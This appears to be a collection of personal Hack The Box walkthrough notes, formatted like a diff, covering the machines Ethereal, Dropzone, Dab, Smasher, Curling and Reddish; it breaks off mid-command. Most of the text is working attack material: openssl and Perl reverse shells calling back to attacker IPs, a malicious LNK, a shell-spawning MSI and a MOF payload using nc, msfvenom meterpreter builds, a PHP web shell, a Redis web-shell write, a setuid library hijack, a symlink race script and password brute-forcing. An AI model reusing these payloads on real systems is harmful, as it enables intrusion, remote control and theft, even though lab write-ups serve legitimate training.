+10.10.15.110 | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.15.110:73 | cmd.exe | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.15.110:136
+ 
+ 
+Now i was trying to run commands as it its on the shell i got but nothings seems to work after for mistake i typed a dir comand and hit send to see if it works then trying to open another shell with webadmin console i didnt stop my preovious shell an run the command again a magic the command worked!
+ 
+So to run commands we must execute the command on port 73 terminal then send admin console web command and it gets executed!
+Now we have to find a way to upload files researching we came to an easy solution
+ 
+on my kali:
+ 
+openssl s_server -quiet -key key.pem -cert cert.pem -port 73 < uploadme.txt
+ 
+on webapp:
+ 
+10.10.15.110 | C:\Progra~2\OpenSLL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.15.110:73 > c:\users\public\desktop\shortcuts\saveme.txt
+ 
+while enumerating we found a file located in c:\users\public\desktop\note-draft.txt which said:
+"I've created a shortcut for VS on the Public Desktop to ensure we use the same version. Please delete any existing shortcuts and use this one instead.
+-Alan
+this command its useful to run a command and if want an answer automatick respond
+echo yes | command to run
+ 
+ 
+Now we have to replace the lnk file located on C:\users\public\desktop\shortcut\"Visual Studio 2017.lnk""
+ 
+sow we can generate one with this program
+ 
+LNKUp(on github)
+ 
+python generate.py --host localhost --type ntlm --output pay.lnk --execute "C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.15.110:73 | cmd.exe | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.15.110:136"
+ 
+then we can encoded in base 64 doing
+ 
+openssl base64 -A -e -in pay.lnk -out pay
+ 
+then copy the string encoded and go to windows machine and run this command:
+ 
+echo | set /p="base64 encoded string" > c:/users/public/desktop/shortcuts/pipo.txt
+ 
+next step its to decode the file which one we put encoded string and at the same time replace the visual studio.lnk
+so we navigate to the dir containing the .lnk file and do this :
+ 
+cd c:\users\public\desktop\shortcuts
+c:\progra~2\openssl-v1.1.0\bin\openssl base64 -A -d -in pipo.txt -out "Visual Studio 2017.lnk"
+type c:\users\public\desktop\shortcuts\"Visual Studio 2017.lnk"# to check if the lnk got replaced
+then if it got replaced you have to kill the 2 shell connections and start it again to wait for jorges connection:
+***note***
+We have to be precise with timing cuz it seems the lnk file gets replaced by the original every few minutes so maybe it will not work at first time cuz timing.
+ 
+Once we have the connection we can now read the user flag.
+type c:\users\jorge\desktop\user.txt
+2b9a4ca09408b4a39d87cbcd7bd524dd
+ 
+PRIVILEGE SCALATION
+Now that I was able to run commands as jorge, I was still unable to execute anything.
+I was, however, able to view the contents of the D:\ volume
+ 
+In the D:\ volume, there was a file D:\DEV\MSIs\note.txt that was from the user
+ethereal\rupal which said:
+ 
+Please drop MSIs that need testing into this folder - I will review regularly.
+Certs have been added to the store already.
+- Rupal
+ 
+The note made it pretty obvious as to what the next step was.
+I needed to generate a malicious .msi file to put in that folder for rupal to “test”.
+ 
+My malicious msi file was as follows:
+##############################################################################
+<?xml version="1.0"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product
+Name" Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
+<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer
+Package"/>
+<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
+<Directory Id="TARGETDIR" Name="SourceDir">
+<Directory Id="ProgramFilesFolder">
+<Directory Id="INSTALLLOCATION" Name="Example">
+<Component Id="ApplicationFiles"
+Guid="12345678-1234-1234-1234-222222222222">
+<File Id="ApplicationFile1" Source="D:\Windows\tracing\test.txt"/>
+</Component>
+</Directory>
+</Directory>
+</Directory>
+<Feature Id="DefaultFeature" Level="1">
+<ComponentRef Id="ApplicationFiles"/>
+</Feature>
+<CustomAction Id="SystemShell" Directory="TARGETDIR" ExeCommand="cmd.exe /c
+C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.6:73| cmd.exe |
+C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.6:136"
+Execute="deferred" Impersonate="yes" Return="ignore"/>
+<CustomAction Id="FailInstall" Execute="deferred" Script="vbscript" Return="check">
+invalid vbs to fail install
+</CustomAction>
+<InstallExecuteSequence>
+<Custom Action="SystemShell" After="InstallInitialize"></Custom>
+<Custom Action="FailInstall" Before="InstallFiles"></Custom>
+</InstallExecuteSequence>
+</Product>
+</Wix>
+##################################################################################
+I used the wix tool set (which can be found at http://wixtoolset.org/releases/ ) on
+my windows vm to compile the msi xml file shown above.
+ 
+I used candle.exe on the msi xml file above which created payload.wixobj
+ 
+then light.exe payload.wixobj which creates the compiled payload.msi
+ 
+I had to download the certs rupal mentioned in his note so I could sign my malicious .msi
+file. The certs were in the D:\certs folder, MyCA.cer and MyCA.pvk
+ 
+I was able to use the certs to sign my malicious msi file using:
+pvk2pfx -pvk C:\temp\MyCa.pvk -spc C:\temp\MyCa.cer -pfx C:\temp\MyCa.pfx
+which created the MyCA.pfx file that includes the cer and pvk
+ 
+makecert -pe -n "CN=My SPC" -a sha256 -cy end -sky signature -ic
+C:\temp\MyCA.cer -iv c:\temp\MyCA.pvk -sv C:\temp\MySPC.pvk c:\temp\MySPC.cer
+which creates a new MySPC.cer and MySPC.pvk for signing
+ 
+pvk2pfx -pvk C:\temp\MySPC.pvk -spc C:\temp\MySPC.cer -pfx C:\temp\MySPC.pfx
+which uses the new cer and pvk files to create my own pfx
+ 
+signtool sign /v /n "Me" /s SPC C:\file.msi
+and finally sign the msi payload file
+ 
+I uploaded my payload msi to C:\windows\tracing\ so that I could copy it to the
+D:\DEV\MSIs folder as needed.
+ 
+When an msi file is uploaded to the D:\DEV\MSIs folder, every few minutes rupal “tests”
+the file and then deletes all msi files in D:\DEV\MSIs .
+ 
+As soon as I copy the msi file with the openssl command, I have to VERY QUICKLY :
+ 
+● exit out of the openssl connection I have as jorge
+● enter the openssl command to wait for a connection again on port 73
+● and then type or paste in a command to be run as rupal.
+If done correctly, you will see the command run as rupal.
+ 
+The command I used was a simple:
+type C:\Users\rupal\Desktop\root.txt
+ 
+1cb6f1fc220e3f2fcc0e3cd8e2d9906f
+ 
+*************************************************************
+ 
+HTB DROPZONE
+1)As usual we start nmap with tcp but nothings shows up wear
+2)now we launch upd scan and we got 1 port
+69 upd tftp server
+3)now we can launch tftp scripts with nmap and found boot.ini
+4)Connecting to the server we download the file
+and we see
+[boot loader]
+timeout=30
+default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+[operating systems]
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
+5)now searching for vulnerabilities we found stuxnet and reading about it i found it uses 4 vulnerabilities one of them its the mof file injection so we can read about it in:
+http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html
+6)so we developed our mof file like this:
+#pragma namespace ("\\\\.\\root\\subscription")
+ 
+class MyClass7307
+{
+ [key]
+ string Name;
+};
+ 
+instance of __EventFilter as $FILTER
+{
+    Name = "XPLOIT_TEST_SYSTEM";
+    EventNamespace = "root\\subscription";
+ Query = "SELECT * FROM __InstanceCreationEvent "
+         "WHERE TargetInstance.__class = \"MyClass7307\"";
+ 
+    QueryLanguage = "WQL";
+};
+ 
+instance of ActiveScriptEventConsumer as $CONSUMER
+{
+    Name = "XPLOIT_TEST_SYSTEM";
+    ScriptingEngine = "VBScript";
+ 
+    ScriptText =
+      "Set objShell = CreateObject(\"WScript.Shell\")\n"
+   "objShell.Run \"C:\\Windows\\system32\\cmd.exe /C C:\\nc.exe 10.10.15.110 4444 -e C:\\Windows\\system32\\cmd.exe\"\n";
+};
+ 
+instance of __FilterToConsumerBinding as $BIND
+{
+    Consumer = $CONSUMER ;
+    Filter = $FILTER ;
+};
+ 
+instance of MyClass7307{
+ Name = "Woot";
+};
+7)then we upload nc.exe to c:\ and the mof file to windows\system32\wbem\mof\filename
+if we want to see if the mof gets compiled we can download the log from windows\system\32\wbem\logs\mofcomp.log
+Everytime we want to upload the mof file we should change the names of the class and of the exploit_test_name
+now we setup our nc listener and upload the mof and we got a shell but instanstly we got kick off
+so i upload a meterpreter payload made with msfvenom.
+Did process again and once on nc shell we call our payload with absolute path and boom we have a meterpreter
+ 
+Now searching for user.txt
+ 
+8)Now looking for that damn flag i got to administrator/Desktop
+where its a root.txt and flag folder both of them are a troll
+For limited time only!                                                                                                          
+Keep an eye on our ADS for new offers & discounts!
+ 
+Now seeing to that ADS thing its has to be a hint so i found something about:
+ 
+ALTERNATE DATA STRINGS
+its a way to hide or something like it text or files in ntfs systems.
+So searching for a way to get read or search that kind of files i found this tool
+streams.exe now e upload and run it accept the eula
+and on administrator\desktop\
+ 
+we run it with streams -s
+ 
+Showing us both flags that were hidden!
+USER:a6a4830ddd27a1bddd59d2aaa80f7940
+ROOT:45cd53a83bf364456386816e35e6a98e
+ 
+ 
+******************************************
+HTB DAB
+1)Nmap show us 4 port
+21 tcp ftp
+22 tcp openssh
+80 tcp web
+8080 tcp web
+2)running dirb doest show us anything no pass user or nothig
+3)on port 80 we found a login form and on port 8080 we see a message wrong password cookie
+now lets try to bruteforce with hydra
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.86 http-post-form "/login:username=admin&password=^PASS^&submit=Login:Error" -t 64
+default most simple user : admin we found its password : Password1
+4)Now we can start making our way in
+5)Capturing the login request with burp we see theres a cookie for our session so i assume i have to use this cookie on the other port.
+6)We capture the request for port 8080
+7)Then we see if we change the cookie we got from admin on port 80 to port 8080 its give us a different response invalid password for cookie so we can appen the value ;password=mypassword; at the end.
+ 
+GET / HTTP/1.1
+Host: 10.10.10.86:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.DrtWBg.AIM2lbINPVlYH3oiuZo8SnvajSM;password=not;
+Connection: close
+Upgrade-Insecure-Requests: 1
+ 
+8)After using burp intruder to try to crack the password and so many attemps i decided to give it a go to wfuzz
+we use it like this:
+wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --hh 324 -u http://10.10.10.86:8080 -b password=FUZZ -t 50
+ 
+and we bruteforce the password getting :    secret
+now we can modify the burp request and set to the correct password
+GET / HTTP/1.1
+Host: 10.10.10.86:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.DrtWBg.AIM2lbINPVlYH3oiuZo8SnvajSM;password=secret;
+Connection: close
+Upgrade-Insecure-Requests: 1
+ 
+9)now showing response in browser we are in page that ask us for a tcp port and a line to execute:
+ 
+URL = http://10.10.10.86:8080/socket?port=6666&cmd=nc%2010.10.15.110
+ 
+when we execute any command we see 500 internal server errro and/or hacking attemp:
+so its running memcached.
+ 
+The fact that a cache engine is being mentioned is a huge hint. A quick google will eventually
+lead us to the memcached software which is a key-based cache that stores data and objects
+wherever spare RAM is available for quick access by applications, without going through layers
+of parsing or disk I/O. According to MySQL and memcached guide, by default, memcached uses
+the following settings:
+ 
+• Memory allocation of 64MB
+• Listens for connections on all network interfaces, using port 11211
+• Supports a maximum of 1024 simultaneous connections
+ 
+Reading a ton about memcached i found this interesting info:
+https://ma.ttias.be/read-keys-values-memcached-instance/
+10)so i run in the memcached server the following commands:
+first:
+stats slabs #to see how many slabs of data there were
+second:
+stats cachedump 26 1000 #26 its the number of the slab where the data its stored there were other slabs but they not contian any data at all.
+this shows us theres a key named users so
+third:
+get key users
+11)this shows us a dic with all the users and their md5 hashes 496 users.
+so we can try and use everyone of them in ssh or we can make a ssh enum with metasploit so fire up and set :
+use auxiliary/scanner/ssh/ssh_enumusers
+set your ports and a txt file containing all the users
+for the dic as its constructed as dic the user its the key value so i made a script to print me just the key values and then stored into a txt file to give to metasploit.
+Run you scanner and the user actually found its:
+cracked with crackstation
+genevieve with hash fc7992e8952a8ff5000cb7856d8586d2:Princess1
+ 
+Use on ssh and we are in!! let get the user flag
+ 
+12)Now into priv Escalation.
+Looking for all steps for priv esc i found a binary called try_harder but its a rabbit hole now searching i found another binary called myexec it ask for password.
+I downloaded to my machine with python simplehttpserver
+now when i try to run it it ask for a library libseclogin as it not installed by default i google it to try an install it and its actually a code from a guest user on pastebin and in the end of writeup theres the password for the same binary
+/usr/bin/myexec actually the password its s3cur3l0g1n.
+Now for the correct way to do it we will diasembly with radare2
+RUN radare2 myexec
+.enter aaa to analize the whole program
+.enter s main to go to the main function
+.now pdf to see the funtion diasembly
+.if you enter VV you enter diagram mode.
+ 
+Now looking for the code wee see theres some lines of text s3curel0 and in a separated variable another string g1n
+which its the password.
+Now running the binary give us this:
+ 
+Password is correct
+ 
+seclogin() called
+ 
+TODO: Placeholder for now, function not implemented yet
+ 
+This is the part which I spent a good amount of time looking into this binary file. One of the
+commands (besides the typical ones such as getfacl, getcap, etc.) is objdump which displays
+information from object files. Let's display the contents of all headers using the -x option for the
+myexec program:
+ 
+$ objdump -x /usr/bin/myexec
+ 
+...
+ 
+Dynamic Section:
+ 
+ NEEDED libseclogin.so
+ 
+ NEEDED libc.so.6
+ 
+...
+ 
+As the output indicates, the myexec binary depends on two dynamic libraries (.so shared objects
+files). This means that the program references these libraries at runtime (similarly to Window's
+.dll). We can see this by running ldd which prints shared object dependencies:
+ 
+$ ldd /usr/bin/myexec
+ 
+ linux-vdso.so.1 => (0x00007ffe00c69000)
+ 
+ libseclogin.so => /usr/lib/libseclogin.so (0x00007f880282f000)
+ 
+ libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f8802465000)
+ 
+ /lib64/ld-linux-x86-64.so.2 (0x00007f8802a31000)
+ 
+Let's focus in libseclogin.so library since libc is the C standard library. The libseclogin shared
+object is owned by root and we have no write permissions in the /usr/lib/ directory from where
+the library is referenced.
+ 
+$ ls -la /usr/lib/libseclogin.so
+ 
+-rwxr-xr-x 1 root root 8120 Mar 25 23:46 /usr/lib/libseclogin.so
+ 
+The vector of attack here would be similar to python library hijacking, and we could actually
+configure dynamic linker run-time bindings using the ldconfig command. Normally, we would
+need root privileges to do such operations, unless the sticky bit is set for ldconfig (which is
+unusual, but in this case it is configured so as we mentioned it earlier). This is where privilege
+escalation takes place, as we can manually link libraries using the -l option of ldconfig.
+now at end of the function it look it calls libseclogin() but its not finished yet so we can create our custom script to call it from our own library like this:
+ 
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <sys/types.h>
+void seclogin()
+{
+        setuid(0);
+        setgid(0);
+        execl("/bin/bash","sh",(char *)0);
+}
+int main(void)
+{
+        seclogin();
+}
+ 
+Compile the code with
+gcc -shared -o libseclogin.so -fPIC libseclogin.c
+ 
+Now
+ldconfig -l /dev/shm/libseclogin.so
+ 
+Since dynamic linker uses the LD_LIBRARY_PATH variable, we need to set that up too:
+ 
+$ LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/dev/shm
+ 
+run ldconfig to change variable path.
+execute myexec and get root flag:
+45cd53a83bf364456386816e35e6a98e
+ 
+***************************************************
+HTB SMASHER
+1)Nmap throws us some results open ports:
+6969 tcp acmsoda
+1111 tcp lmsocialserver
+22 tcp openssh
+2)Running dirb doesnt show us anything
+3)Navigating through the ports no one seems to respond but for a second i got a response from port 1111 on web
+it seems theres a service that restarts every 60 seconds that why i was no having responses at all
+4)Again runing dirb doesnt shows anything
+5) Running nikto we found its vulnerable to LFI
+6)In 1111 webpage we see theres something like dir we select index.html and see a login page perhaps we can navigate further if we scape another "/" so we go to http://10.10.10.89:1111// and we see all the dirs listed online.
+7)Looking inside the dirs i managed to find http://10.10.10.89:1111//home/www/
+In there is a tiny-web-server binary so i downloaded i begin to try to pwn it.
+The binary has been compiled with NX so the stack its executable
+ 
+Now we have 2 options to make this buffer overflow:
+By leak(exploit.leak)
+Or ROP to try to execute JMP ESP (exploitnoleak.py)
+ 
+ill try with ROP once we have our python exploit we can generate our shellcode with:
+ 
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.15.168 LPORT=443 -b '\x00\x09\x0a\x0b\x0c\x0d\x20\x21' -f python
+ 
+and we got a connection, now we can upgrade our shell to meterpreter with sessions -u id:
+ 
+Running some enumeration we find with netsat -antp
+ 
+a proccess its running locally listening on tcp port 1337
+ 
+nc 127.0.0.1 1337
+ 
+[*] Welcome to AES Checker! (type 'exit' to quit)
+[!] Crack this one: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==
+Insert ciphertext: $ test
+Generic error, ignore me!
+Posible Padding Oracle Attack.
+ 
+So we have to upload a socat binary
+ 
+and run this way:
+socat TCP-LISTEN:1550,fork TCP:localhost:1337 ← En la máquina Smasher
+ 
+This to create a tunnel to be able to attack 1337 through smasher ip on port 1550 its listening and then fork this to localhost:1337.
+ 
+Running the paddle oracle attack script and letting it work we got:
+ 
+After 1 year and 67 minutes we got our decrypted string:
+ 
+DEBUG:root:No padding exception raised on 'ujCJcv+cH+VbLFWs7SPHdaOoUqOraIKi2CExhqT7F3Y='
+INFO:PadBuster:Decrypted block 3: 'eMaster123\x06\x06\x06\x06\x06\x06'
+Decrypted somecookie: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==
+=> bytearray(b"SSH password for user \'smasher\' is: PaddingOracleMaster123
+ 
+Now we can loggin through SSH.
+ 
+Once we are in we can read our user.txt
+ 
+baabc5e4ed55bcc176a2ed5d49b4befb
+ 
+Now as usual running our enumeration proccess the first a always run its to find SUID BIT enabled binary
+ 
+find / -user root -perm -4000 -print 2>/dev/null
+ 
+we manage to found this one:
+ 
+/usr/bin/checker   >>>>>> RACE CONDITION!
+ 
+Now running strings on this binary we managed to found its using sleep function to create a link to read root.txt,
+during sleep() execution we can execute a privilege action.
+Thats how we can exploit the race condition of this binary
+ 
+For that we will create a file, we will get this file to execute as entry point to the binary through a script in bash and while sleep(), we will delete the file previusly created to make a symbolic link with the root flag, since we are on binary privileges.
+ 
+So first go to /home/smasher dir
+ 
+then create a sh file i named i.sh inside the file run this:
+ 
+#!/bin/bash
+touch i
+checker i &
+sleep .5
+rm i
+ln -s /root/root.txt i
+ 
+then run bash i.sh
+ 
+smasher@smasher:~$ bash i.sh
+[+] Welcome to file UID checker 0.1 by dzonerzy
+ 
+smasher@smasher:~$ File UID: 1001
+ 
+Data:
+077af1365ed28ef0cc56dc31065c09bf
+ 
+root flag.!!!
+ 
+ 
+*************************************
+ 
+HTB CURLING
+1)Enumeration with nmap show us 2 open port 80,22
+2)Acces with browser its a joomla webpage with some info
+3)researching the source code we found a directory to upload and file called secret.txt with a base64 encoded password which is: Curling2018!
+Now reading on the webpage we see Super User posts but one of them its signed by a user named floris so we try to login with floris:Curling2018 and it worked.
+Now searching through dirs we found /administrator page for joomla login:
+and the same credentials worked well.
+now we must find a way to upload something.
+logged to joomla we found and interesting module to upload now just set it up and allow some file type like php to get your reverse shell
+***********************
+<?php echo '<b><br><br>'.php_uname().'<br></b>'; echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'; echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>'; if( $_POST['_upl'] == "Upload" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>toborbitch</b><br><br>'; } else { echo '<b>Upload Sucess !!!</b><br><br>'; } } ?>
+***********************
+4)Then we search a directory to upload files
+http://10.10.10.150/index.php/component/users/?view=remind&Itemid=101
+and accept php files so we try to upload a php-reverse shell and it worked
+now we are inside www-data user we see a pass backup
+now we see its a hexdump file so the method to decrypt this types of files its:
+xxd -r password_backup
+then the result file we have to see what type its so we use:
+file password_backup
+then change file extension to the type of file it its and decompress
+then again check file, change extension, decompress until you get something readable
+5)Now we got the password: for floris user which is : 5d<wdCbdZu)|hChXll
+6)login in through ssh and get the user flag.
+7)Now for privilege scalation
+8)We see a folder called admin-area its seems suspicious so we go to dir and we found to files one called input which parses all 127.0.0.1 data to the other file named report. and its running as root! so we can take advantage on this:
+On the input file we can overwrite its contents and put:
+url = "file:///root/root.txt"
+before it was url= "http://127.0.0.1/""
+and automatic you will get you key
+from etc/shadow  root hash>>>>  $6$RIgrVboA$HDaB29xvtkw6U/Mzq4qOHH2KHB1kIR0ezFyjL75DszasVFwznrsWcc1Tu5E2K4FA7/Nv8oje0c.bljjnn6FMF1
+ 
+and we got the root flag: 82c198ab6fc5365fdc6da2ee5c26064a
+ 
+**********************************************
+ 
+HTB REDDISH
+1)As usual we run our nmap scan and show us just tcp port 1880
+2)we navigate to it in browser and just got a /get response
+3)gobuster -t 150 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-
+medium.txt -u http://10.10.10.94:1880/ -x txt,js
+Three directories are returned: icons, red, and vendor. We can enumerate all three just like we
+did above. One interesting file found is /red/about, which shows us the version of the application
+and helps us.
+Browsing to http://10.10.10.94:1880/ gives the following error:
+If we can’t GET /, then how about we try to POST /. You can do this via BURP and get:
+ 
+4)Now we can search for post or get request with curl on the main page
+5)Running curl -X POST http://10.10.10.94:1880
+we got a response with a path and an id
+6)Using this path and id like it showed us we managed to login to node-red cli
+Using the RCE technique above, we can run basic commands to get an understanding of what is
+installed on the box to help us upgrade to a reverse shell. Commands like “which nc” are a good
+and simple way to see if individual programs are present. We can also test for outbound
+connectivity by having Exec run a ping to our Kali box. You will need to modify the Exec node,
+redeploy the flow, and initiate it each time you want to change the command.
+This is a very stripped-down Linux box. The only useful program that I was able to find was perl.
+We can get a reverse shell by modifying Exec to run the following perl script found on Pentest
+Monkey’s Reverse Shell Cheat Sheet. Replace the IP and port with your own. You can leave the
+output attached to debug or delete it; it won’t affect the shell either way.
+*****************************************************************************
+perl -e 'use
+Socket;$i="10.10.14.3";$p=8050;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))
+;if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S")
+;open(STDERR,">&S");exec("/bin/bash -i");};'
+*****************************************************************************
+ 
+Setup your listener, deploy the flow, and click the button on the timestamp node to initiate it
+7)Playing around with setting we managed to get a reverse shell with the following:
+make a tcp-in with ip:port to listen on
+make a exec as default
+make a tcp-out with reply to tcp
+connect it all and run
+ 
+the other way its importing an already created reverse shell flow:
+[{"id":"7235b2e6.4cdb9c","type":"tab","label":"Flow 1"},{"id":"d03f1ac0.886c28","type":"tcp out","z":"7235b2e6.4cdb9c","host":"","port":"","beserver":"reply","base64":false,"end":false,"name":"","x":786,"y":350,"wires":[]},{"id":"c14a4b00.271d28","type":"tcp in","z":"7235b2e6.4cdb9c","name":"","server":"client","host":"10.10.15.110","port":"9999","datamode":"stream","datatype":"buffer","newline":"","topic":"","base64":false,"x":281,"y":337,"wires":[["4750d7cd.3c6e88"]]},{"id":"4750d7cd.3c6e88","type":"exec","z":"7235b2e6.4cdb9c","command":"","addpay":true,"append":"","useSpawn":"false","timer":"","oldrc":false,"name":"","x":517,"y":362.5,"wires":[["d03f1ac0.886c28"],["d03f1ac0.886c28"],["d03f1ac0.886c28"]]}]
+   
+ 
+whithout previously had a nc listening
+ 
+8)We got a shell but its a container and has not tty so we can use shellpop to bring us a tty so we use perl:
+in actual nc connection we put this perl command:
+shellpop --reverse --number 5 --host tun0 --port 2001
+ 
+perl -M Socket -e "\$PKHrmaUTMiwXjh='10.10.15.110';\$VsKVSQDNYqNCy=2000;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$VsKVSQDNYqNCy,inet_aton(\$PKHrmaUTMiwXjh)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};"
+now we listen for conection with nc in the port we specify and we got a tty shell just do bash -i !
+*****To upgrade to meterpreter::******
+1)
+now we can upgrade to a meterpreter shell launch msf and
+set multi/handler
+set payload linux/x86/shell/reverse_tcp and run
+once you got it background CTRL+Z
+and session -u "sessions_id"    or  use post/multi/manage/shell_to_meterpreter
+>meterpreter>
+2)
+another way its creating an elf file like this:
+(not through post/multi/manage/shell_to_meterpreter module because the session
+was dying often). Instead, I created an ELF file, transferred it to the container using base64
+encoding/decoding, set up a listener and executed the file.
+In our local machine:
+$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.76 LPORT=2002
+-f elf -o meterpreter.elf
+...
+$ base64 -w 0 meterpreter.elf
+...
+$ sudo msfconsole -q
+...
+In the target machine:
+# echo -n <b64 string> | base64 -d > meterpreter.elf
+# chmod +x meterpreter.elf
+# ./meterpreter.elf
+******************************************************
+9)running /sbin/ip a 2>/dev/null we managed to find some new interfaces on this machine
+ 
+Now that we have two potential IPs to target, let’s start enumeration. We don’t have nmap, nc, or
+other useful port scanning options available to us, but there are still a few ways we can do this.
+• We could transfer over a statically compiled version of nc, nmap, or another tool
+• We could try setting up a dynamic tunnel and port scan through proxychains
+• We could use built-in bash scripting for scanning
+• We could run a perl port scanning script
+There may be more methods that I didn’t consider, but I chose to try the bash script since it
+didn’t mean having a dependency on other binaries or script files.
+for p in {1..65535}; do echo hi > /dev/tcp/172.19.0.2/$p && echo port $p is open >
+scan 2>/dev/null; done
+The screen will get cluttered with errors due to the nature of our reverse shell, but the successful
+output will be written to the file ‘scan’. Running this command on the two IPs give us what ports
+are open on each container:
+172.18.0.x 172.19.0.x
+.1 GW .1 GW
+.2 NODE-RED (1880) .2 Alive (6379)
+.3 NODE-RED (1880)
+.4 Alive (80)
+A quick Google search shows that port 6379 typically belongs to a Redis/NoSQL database
+server. Web servers are usually easier to enumerate and exploit, so let’s look at the .4 IP first.
+eth0:   172.18.0.2
+eth1:   172.19.0.4
+now we install nmap on the remote mahchine and run a tcp scan for all ports and all ips x.x.x.x/16
+we found we have 172.19.0.3 with open port 6379 redis
+and 172.19.0.2   with 80 open port apache
+ 
+10)Now we procced to instal nmap uploading it and or redis-cli to start dumping the db.
+ 
+Bash Exploiter:
+ay IP address), 172.19.0.2 , and 172.19.0.3 (which will be our next targets). Considering
+the fact that we are already root at the container and there is nothing in there, we should move on
+with pivoting techniques for the internal network of 172.19.0.0/16 .
+3We will now scan the two target internal hosts for open port. We will use a perl portscanner that
+is available on github (since perl is installed in the machine). Results are:
+ 
+Host 172.19.0.3 has an open port at 6379 (Redis);
+Host 172.19.0.2              has an open port at 80 (HTTP).
+ 
+Next, we will relay connections on these ports to our local machine using metasploit’s portfwd
+with 172.19.0.4 (the container) being as our intermediary:
+       
+meterpreter> portfwd add -l 80 -r 172.19.0.2 -p 80
+meterpreter> portfwd add -l 6379 -r 172.19.0.3 -p 6379
+ 
+Now http://localhost/ will show the following:
+If we examine the HTML source code carefully, we will notice that the webserver has a PHP file
+called ajax.php that connects with Redis DB through a parameter called test :
+/8904n0549008565c554f8108cn11fna4/ajax.php?test=get hits
+ 
+Redis has eloquently explained how it can be used for remote command execution if not securely
+configured to mitigate arbitrary access. You can read about the article here:
+https://dl.packetstormsecurity.net/1511-exploits/redis-exec.txt
+ 
+We can try to abuse the vulenerability by uploading a PHP file. I will use redis-cli ( redis
+package is required), and since we already have port fowarding on, the commands we enter will
+relay to 172.19.0.2:6379 . We don’t need to specify a port for redis-cli since it runs by default
+on 6379 and that is exactly the same port we are listening through portfwd . I made the following
+script to automate the process of creating a shell.php file in the /var/www/html directory that
+expects a cmd query to execute system commands, in case our PHP gets removed.
+ 
+#!/bin/bash
+redis-cli flushall
+redis-cli set myshell "<?php echo system(\$_REQUEST['cmd']); ?>"
+redis-cli config set dbfilename "shell.php"
+redis-cli config set dir /var/www/html
+redis-cli save
+ 
+4We should see bunch of OKs after running the script, which means that http://localhost/shell.php
+now exists, and we have RCE as www-data (http://localhost/shell.php?cmd=whoami).
+We can get a shell by uploading a perl script in the /tmp directory of the internal host. Since the
+internal host cannot communicate with our local machine, the reverse shell should point at the
+container ( 172.19.0.4:3000 ), which then we will redirect that traffic to our machine by using a
+tool called socat .
+ 
+The perl script will look like this:
+1)perl -e 'use Socket;$i="172.19.0.4";$p=3000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+then can base64 and URL encode this script and upload it through curl as /tmp/shell.pl or we can run it directly from the browser php shell we have.
+ 
+2)perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"172.19.0.4:3000");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
+**************************
+curl --data "cmd=echo+-n+  
+dXNlIFNvY2tldDskaT0nMTcyLjE5LjAuNCc7JHA9MzAwMDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU
+1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLG
